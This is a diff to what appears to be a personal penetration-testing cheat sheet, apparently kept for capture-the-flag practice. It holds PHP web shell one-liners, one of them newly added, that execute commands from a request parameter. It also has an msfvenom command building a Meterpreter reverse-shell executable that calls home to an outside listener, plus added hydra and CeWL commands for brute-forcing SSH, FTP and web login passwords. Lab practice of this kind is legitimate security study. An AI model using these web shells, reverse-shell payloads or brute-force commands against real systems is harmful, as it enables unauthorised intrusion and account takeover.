@@ -8,6 +8,10 @@ PHP one liner:
 
 `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`
 
+Tighter: 
+
+`<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`
+
 PHP interactive shell:
 
 ```
@@ -99,7 +103,17 @@ creating a windows exe that will call home:
 
 `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.100.16 LPORT=4443 -f exe -o callhome.exe`
 
-## Brute forcing with hydra
+## Brute forcing with hydra and cewl
+
+CeWL generates a wordlist from a page. `cewl 192.168.154.10 > words.txt` will create a mini list, which was useful in one challenge based on bruteforcing with this list.
+
+For hydra, `-l` specifies a username, `-L` a username source file, `-p` a password and `-P` a password list
+
+SSH or FTP (swap the last bit by protocol):
+
+`hydra -L users.txt -P passwords.txt 192.168.154.10 ssh`
+
+Regular login form (for wordpress dont do this, just use wp-scan with the -U, -P options):
 
 `hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.php:username=^USER^&password=^PASS^&login=login:Login failed"`
 
